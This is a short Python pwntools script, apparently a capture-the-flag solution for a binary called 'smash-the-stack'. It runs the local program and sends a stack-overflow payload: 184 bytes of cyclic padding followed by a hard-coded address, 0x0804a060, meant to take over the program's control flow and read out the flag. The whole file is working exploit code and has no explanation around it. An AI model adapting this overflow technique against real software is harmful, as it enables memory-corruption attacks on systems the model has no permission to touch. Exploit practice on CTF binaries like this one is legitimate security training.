#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

io = process("./smash-the-stack")

payload = flat([0x1, cyclic(184), 0x0804a060])
io.sendlineafter("flag\n", payload)
print io.recv()
io.close()

